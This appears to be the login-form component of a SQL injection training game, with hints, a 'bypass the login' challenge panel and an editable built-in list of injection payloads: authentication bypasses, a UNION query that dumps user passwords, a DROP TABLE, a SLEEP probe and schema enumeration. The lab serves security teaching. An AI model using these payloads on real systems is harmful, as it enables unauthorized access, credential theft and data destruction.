'use client';

import { useState } from 'react';
import { LoginCredentials, ApiResponse } from '@/types';

interface LoginFormProps {
  level: number;
  title: string;
  description: string;
  onSubmit: (credentials: LoginCredentials) => Promise<ApiResponse>;
  hints: string[];
  isVulnerable?: boolean;
}

export default function LoginForm({ 
  level, 
  title, 
  description, 
  onSubmit, 
  hints, 
  isVulnerable = true 
}: LoginFormProps) {
  const [credentials, setCredentials] = useState<LoginCredentials>({
    username: '',
    password: ''
  });
  const [response, setResponse] = useState<ApiResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [showHints, setShowHints] = useState(false);
  const [showPayloads, setShowPayloads] = useState(false);
  const [editingPayload, setEditingPayload] = useState<number | null>(null);
  const [newPayload, setNewPayload] = useState('');
  const [showPayloadManager, setShowPayloadManager] = useState(false);
  const [editingPayloadValue, setEditingPayloadValue] = useState('');

  // Initialize payloads state with default common payloads
  const [commonPayloads, setCommonPayloads] = useState([
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT username, password FROM users --",
    "' OR username='admin' --",
    "1' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR SLEEP(5) --",
    "' UNION SELECT 1, table_name, null, null, null, null FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0--",
  ]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setResponse(null);

    try {
      const result = await onSubmit(credentials);
      setResponse(result);
    } catch (error) {
      setResponse({
        success: false,
        error: 'Network error occurred'
      });
    } finally {
      setLoading(false);
    }
  };

  // Payload management functions
  const addPayload = () => {
    if (newPayload.trim() && !commonPayloads.includes(newPayload.trim())) {
      setCommonPayloads([...commonPayloads, newPayload.trim()]);
      setNewPayload('');
    }
  };

  const deletePayload = (index: number) => {
    setCommonPayloads(commonPayloads.filter((_, i) => i !== index));
  };

  const startEditPayload = (index: number) => {
    setEditingPayload(index);
    setEditingPayloadValue(commonPayloads[index]);
  };

  const saveEditPayload = () => {
    if (editingPayload !== null && editingPayloadValue.trim()) {
      const updatedPayloads = [...commonPayloads];
      updatedPayloads[editingPayload] = editingPayloadValue.trim();
      setCommonPayloads(updatedPayloads);
      setEditingPayload(null);
      setEditingPayloadValue('');
    }
  };

  const cancelEditPayload = () => {
    setEditingPayload(null);
    setEditingPayloadValue('');
  };

  return (
    <div className="max-w-4xl mx-auto">
      {/* Level Header */}
      <div className="mb-8 text-center">
        <h1 className="text-4xl font-bold mb-4 bg-gradient-to-r from-cyber-blue to-cyber-purple bg-clip-text text-transparent">
          Level {level}: {title}
        </h1>
        <p className="text-gray-300 text-lg max-w-2xl mx-auto">
          {description}
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Login Form */}
        <div className="vulnerability-card rounded-lg p-8">
          <h2 className="text-2xl font-semibold mb-6 text-cyber-blue">
            🔐 Login Portal
          </h2>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label htmlFor="username" className="block text-sm font-medium text-gray-300 mb-2">
                Username
              </label>
              <input
                type="text"
                id="username"
                value={credentials.username}
                onChange={(e) => setCredentials({ ...credentials, username: e.target.value })}
                className="w-full px-4 py-3 bg-black/50 border border-cyber-blue/30 rounded-lg 
                         text-white placeholder-gray-500 focus:border-cyber-blue focus:outline-none
                         focus:ring-2 focus:ring-cyber-blue/20 transition-all duration-300"
                placeholder="Enter username..."
                required
              />
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                Password
              </label>
              <input
                type="password"
                id="password"
                value={credentials.password}
                onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
                className="w-full px-4 py-3 bg-black/50 border border-cyber-blue/30 rounded-lg 
                         text-white placeholder-gray-500 focus:border-cyber-blue focus:outline-none
                         focus:ring-2 focus:ring-cyber-blue/20 transition-all duration-300"
                placeholder="Enter password..."
                required
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full cyber-button py-3 rounded-lg font-semibold transition-all duration-300
                       disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? (
                <span className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-black mr-2"></div>
                  Authenticating...
                </span>
              ) : (
                'Login'
              )}
            </button>
          </form>

          {/* Response Display */}
          {response && (
            <div className={`mt-6 p-4 rounded-lg border ${
              response.success 
                ? 'bg-cyber-green/10 border-cyber-green/30 text-cyber-green' 
                : 'bg-cyber-red/10 border-cyber-red/30 text-cyber-red'
            }`}>
              <h3 className="font-semibold mb-2">
                {response.success ? '✅ Success' : '❌ Error'}
              </h3>
              <p className="text-sm">
                {response.message || response.error}
              </p>
              {response.data && (
                <pre className="mt-3 text-xs bg-black/30 p-3 rounded border overflow-x-auto">
                  {JSON.stringify(response.data, null, 2)}
                </pre>
              )}
            </div>
          )}
        </div>

        {/* Hints and Tools */}
        <div className="space-y-6">
          {/* Hints Section */}
          <div className="vulnerability-card rounded-lg p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-xl font-semibold text-cyber-green">💡 Hints</h3>
              <button
                onClick={() => setShowHints(!showHints)}
                className="text-cyber-blue hover:text-cyber-green transition-colors duration-300"
              >
                {showHints ? 'Hide' : 'Show'} Hints
              </button>
            </div>
            
            {showHints && (
              <div className="space-y-3">
                {hints.map((hint, index) => (
                  <div key={index} className="text-sm text-gray-300 p-3 bg-black/30 rounded border-l-4 border-cyber-green">
                    <span className="text-cyber-green font-semibold">Hint {index + 1}:</span> {hint}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Common Payloads */}
          {isVulnerable && (
            <div className="vulnerability-card rounded-lg p-6">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-xl font-semibold text-cyber-purple">🎯 Common Payloads</h3>
                <div className="flex gap-2">
                  <button
                    onClick={() => setShowPayloadManager(!showPayloadManager)}
                    className="text-xs px-3 py-1 bg-cyber-purple/20 text-cyber-purple hover:bg-cyber-purple/30 rounded transition-colors duration-300"
                  >
                    {showPayloadManager ? 'Hide' : 'Manage'}
                  </button>
                  <button
                    onClick={() => setShowPayloads(!showPayloads)}
                    className="text-cyber-blue hover:text-cyber-purple transition-colors duration-300"
                  >
                    {showPayloads ? 'Hide' : 'Show'} Payloads
                  </button>
                </div>
              </div>
              
              {showPayloads && (
                <div className="space-y-3">
                  {/* Payload List */}
                  <div className="space-y-2">
                    {commonPayloads.map((payload, index) => (
                      <div key={index} className="flex items-center gap-2 group">
                        {editingPayload === index ? (
                          <div className="flex-1 flex items-center gap-2">
                            <input
                              type="text"
                              value={editingPayloadValue}
                              onChange={(e) => setEditingPayloadValue(e.target.value)}
                              className="flex-1 px-2 py-1 text-xs bg-black/50 border border-cyber-purple/30 rounded 
                                       text-white focus:border-cyber-purple focus:outline-none"
                              onKeyDown={(e) => {
                                if (e.key === 'Enter') saveEditPayload();
                                if (e.key === 'Escape') cancelEditPayload();
                              }}
                              autoFocus
                            />
                            <button
                              onClick={saveEditPayload}
                              className="text-cyber-green hover:text-green-400 text-xs px-2 py-1"
                              title="Save (Enter)"
                            >
                              ✓
                            </button>
                            <button
                              onClick={cancelEditPayload}
                              className="text-cyber-red hover:text-red-400 text-xs px-2 py-1"
                              title="Cancel (Escape)"
                            >
                              ✗
                            </button>
                          </div>
                        ) : (
                          <>
                            <div 
                              className="flex-1 code-block text-sm cursor-pointer hover:bg-gray-800/50 transition-colors duration-300"
                              onClick={() => {
                                setCredentials({ ...credentials, username: payload, password: 'anything' });
                              }}
                              title="Click to use this payload"
                            >
                              {payload}
                            </div>
                            {showPayloadManager && (
                              <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                                <button
                                  onClick={() => startEditPayload(index)}
                                  className="text-cyber-blue hover:text-blue-400 text-xs px-2 py-1"
                                  title="Edit payload"
                                >
                                  ✏️
                                </button>
                                <button
                                  onClick={() => deletePayload(index)}
                                  className="text-cyber-red hover:text-red-400 text-xs px-2 py-1"
                                  title="Delete payload"
                                >
                                  🗑️
                                </button>
                              </div>
                            )}
                          </>
                        )}
                      </div>
                    ))}
                  </div>

                  {/* Add New Payload */}
                  {showPayloadManager && (
                    <div className="mt-4 p-4 bg-black/30 rounded border border-cyber-purple/30">
                      <h4 className="text-sm font-semibold text-cyber-purple mb-3">Add New Payload</h4>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          value={newPayload}
                          onChange={(e) => setNewPayload(e.target.value)}
                          placeholder="Enter new SQL injection payload..."
                          className="flex-1 px-3 py-2 text-sm bg-black/50 border border-cyber-purple/30 rounded 
                                   text-white placeholder-gray-500 focus:border-cyber-purple focus:outline-none
                                   focus:ring-2 focus:ring-cyber-purple/20"
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') addPayload();
                          }}
                        />
                        <button
                          onClick={addPayload}
                          disabled={!newPayload.trim() || commonPayloads.includes(newPayload.trim())}
                          className="px-4 py-2 bg-cyber-purple/20 text-cyber-purple hover:bg-cyber-purple/30 
                                   rounded text-sm transition-colors duration-300 disabled:opacity-50 
                                   disabled:cursor-not-allowed"
                        >
                          Add
                        </button>
                      </div>
                      {newPayload.trim() && commonPayloads.includes(newPayload.trim()) && (
                        <p className="text-xs text-cyber-red mt-2">This payload already exists</p>
                      )}
                    </div>
                  )}

                  {/* Help Text */}
                  <div className="text-xs text-gray-500 mt-3 space-y-1">
                    <p>💡 Click on any payload to automatically fill the username field</p>
                    {showPayloadManager && (
                      <p>🔧 Hover over payloads to see edit/delete options</p>
                    )}
                    <p className="text-cyber-purple">📊 Total payloads: {commonPayloads.length}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Challenge Info */}
          <div className="vulnerability-card rounded-lg p-6">
            <h3 className="text-xl font-semibold text-cyber-blue mb-4">🎯 Challenge Objective</h3>
            <div className="space-y-3 text-sm text-gray-300">
              <p>
                <span className="text-cyber-green font-semibold">Goal:</span> Successfully bypass the login authentication
              </p>
              <p>
                <span className="text-cyber-green font-semibold">Method:</span> Exploit SQL injection vulnerabilities
              </p>
              <p>
                <span className="text-cyber-green font-semibold">Success:</span> Gain unauthorized access to the system
              </p>
            </div>
          </div>

          {/* Level Navigation */}
          <div className="vulnerability-card rounded-lg p-6">
            <h3 className="text-xl font-semibold text-cyber-blue mb-4">🚀 Navigation</h3>
            <div className="flex flex-wrap gap-2">
              {[1,2,3,4,5,6,7,8].map((levelNum) => (
                <a
                  key={levelNum}
                  href={`/level${levelNum}`}
                  className={`px-3 py-1 rounded text-sm transition-all duration-300 ${
                    levelNum === level
                      ? 'bg-cyber-blue text-black font-semibold'
                      : 'bg-cyber-blue/20 text-cyber-blue hover:bg-cyber-blue/30'
                  }`}
                >
                  Level {levelNum}
                </a>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
